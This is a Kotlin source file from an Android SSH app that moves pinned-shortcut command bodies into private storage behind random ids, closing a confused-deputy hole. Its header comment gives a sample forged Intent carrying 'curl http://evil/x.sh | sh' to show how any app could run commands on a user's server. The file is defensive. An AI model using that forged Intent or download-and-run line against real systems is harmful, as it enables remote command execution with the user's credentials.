package com.twig.app

import android.content.Context
import org.json.JSONObject

/**
 * Storage for **command bodies** of desktop command shortcuts (app-private
 * SharedPreferences).
 *
 * Why this layer exists — [ui.RunCommandActivity] has to be `exported="true"`:
 * minSdk is 24, and on API < 25 pinned shortcuts go through the old
 * `INSTALL_SHORTCUT` broadcast, after which the **launcher process** fires the
 * Intent directly; an un-exported target Activity just won't start.
 *
 * That made the old "command text stuffed into Intent extras" an exploitable
 * hole: any app on the device — **without any permissions** — could run
 *
 * ```
 * startActivity(Intent()
 *     .setClassName("com.twig.app", "com.twig.app.ui.RunCommandActivity")
 *     .putExtra("cmd_conn", "sftp://root@192.168.1.10:22")
 *     .putExtra("cmd_command", "curl http://evil/x.sh | sh")
 *     .putExtra("cmd_terminal", false))
 * ```
 *
 * and get Twig to **connect to the server using the user's saved credentials**
 * and execute arbitrary commands silently. The attacker doesn't have the server
 * password, but via Twig they get execution (confused deputy). The only barrier
 * is guessing a connection label, and its format is `sftp://<user>@<host>:<port>`,
 * low enough entropy in home use to brute-force.
 *
 * The Intent now only carries a random id from [newId]; the command body lives
 * here (app-private dir, other apps can't read). Even a forged Intent can only
 * trigger commands the **user themselves created**, and the id isn't guessable.
 *
 * Note: the in-app execution path through [ui.CmdService] is unaffected and
 * doesn't need an id — that Service is `exported="false"`, no other app can
 * start it, so we continue to pass full extras.
 */
object RemoteCmdStore {

    private const val FILE = "twig_cmds"

    /** Key holding the write-sequence counter; not a command entry, must be skipped when enumerating. */
    private const val KEY_SEQ = "_seq"

    /**
     * Entry cap. Under normal usage a user doesn't pin dozens of command
     * shortcuts; the cap is just to keep pathological cases (e.g. repeated
     * "run now" writes) from growing without bound. When over the cap, the
     * earliest-written ones go first — their shortcuts stop working, but they
     * were already long-ago.
     */
    private const val MAX = 100

    private fun sp(ctx: Context) = ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE)

    /** A row stored in prefs: command body + write sequence (used to determine order when trimming). */
    private class Row(val seq: Long, val cmd: RemoteCmd)

    private fun rowsOf(ctx: Context): Map<String, Row> =
        sp(ctx).all.mapNotNull { (k, v) ->
            if (k == KEY_SEQ) return@mapNotNull null
            runCatching {
                val o = JSONObject(v as String)
                k to Row(o.optLong("seq", 0L), RemoteCmd.fromJson(o.getJSONObject("cmd")))
            }.getOrNull()
        }.toMap()

    /**
     * Stores a command and returns its id. **If the content is identical, the
     * existing id is reused** — pinning the same command to the desktop twice
     * (e.g. user moved an icon and re-added it) shouldn't pile up duplicate rows.
     */
    fun put(ctx: Context, cmd: RemoteCmd): String {
        val sp = sp(ctx)
        val rows = rowsOf(ctx)
        rows.entries.firstOrNull { it.value.cmd == cmd }?.let { return it.key }

        val seq = sp.getLong(KEY_SEQ, 0L) + 1
        val ed = sp.edit().putLong(KEY_SEQ, seq)
        // Make room before exceeding the cap: SharedPreferences is unordered, so
        // trim by write sequence — drop the earliest ones first.
        if (rows.size >= MAX) {
            rows.entries.sortedBy { it.value.seq }
                .take(rows.size - MAX + 1)
                .forEach { ed.remove(it.key) }
        }
        val id = newId()
        val json = JSONObject().put("seq", seq).put("cmd", cmd.toJson()).toString()
        ed.putString(id, json).apply()
        return id
    }

    fun get(ctx: Context, id: String): RemoteCmd? = rowsOf(ctx)[id]?.cmd

    /**
     * 128-bit random id. Must use [java.security.SecureRandom] rather than a
     * deterministic hash — the entire protection rests on "outside apps can't
     * guess this value"; a content-derived id would be no protection at all.
     */
    private fun newId(): String {
        val b = ByteArray(16)
        java.security.SecureRandom().nextBytes(b)
        return b.joinToString("") { "%02x".format(it) }
    }
}
